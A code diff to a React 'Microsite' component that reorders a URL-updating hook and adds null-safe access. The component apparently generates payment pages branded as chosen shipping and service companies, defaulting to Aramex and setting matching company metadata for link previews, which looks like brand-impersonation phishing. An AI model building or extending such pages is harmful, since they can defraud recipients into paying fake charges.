@@ -31,6 +31,19 @@ const Microsite = () => {
   const { data: link, isLoading } = useLink(id);
   const countryData = getCountryByCode(country || "");
   
+  const payload = link?.payload;
+  const serviceKey = payload?.service_key || 'aramex';
+  const isShipping = link?.type === 'shipping';
+  
+  React.useEffect(() => {
+    if (!link) return;
+    const currentUrl = new URL(window.location.href);
+    if (isShipping && serviceKey && !currentUrl.searchParams.has('service')) {
+      currentUrl.searchParams.set('service', serviceKey);
+      window.history.replaceState({}, '', currentUrl.toString());
+    }
+  }, [isShipping, serviceKey, link]);
+  
   if (isLoading) {
     return (
       <div className="min-h-screen flex items-center justify-center">
@@ -50,10 +63,8 @@ const Microsite = () => {
     );
   }
   
-  const payload = link.payload;
-
   // Get amount from payload - ensure it's a number, handle all data types
-  const rawAmount = payload.cod_amount;
+  const rawAmount = payload?.cod_amount;
 
   // Handle different data types and edge cases
   let amount = 500; // Default value
@@ -69,7 +80,6 @@ const Microsite = () => {
   }
 
   // Determine service type
-  const isShipping = link.type === 'shipping';
   const isInvoice = link.type === 'invoices';
   const isHealth = link.type === 'health';
   const isLogistics = link.type === 'logistics';
@@ -77,21 +87,11 @@ const Microsite = () => {
   const isChalet = link.type === 'chalet';
 
   // Get service branding for SEO and display
-  const serviceName = payload.service_name || payload.chalet_name;
-  const serviceKey = payload.service_key || 'aramex';
+  const serviceName = payload?.service_name || payload?.chalet_name;
   const serviceBranding = getServiceBranding(serviceKey);
 
   // Get dynamic company metadata for OG tags
   const companyMeta = getCompanyMeta(serviceKey);
-
-  // Update URL to include service information for better SEO
-  React.useEffect(() => {
-    const currentUrl = new URL(window.location.href);
-    if (isShipping && serviceKey && !currentUrl.searchParams.has('service')) {
-      currentUrl.searchParams.set('service', serviceKey);
-      window.history.replaceState({}, '', currentUrl.toString());
-    }
-  }, [isShipping, serviceKey]);
 
   // Get service description from serviceBranding to match the chosen company
   const serviceDescription = serviceBranding.description || `خدمة ${serviceName} - نظام دفع آمن ومحمي`;
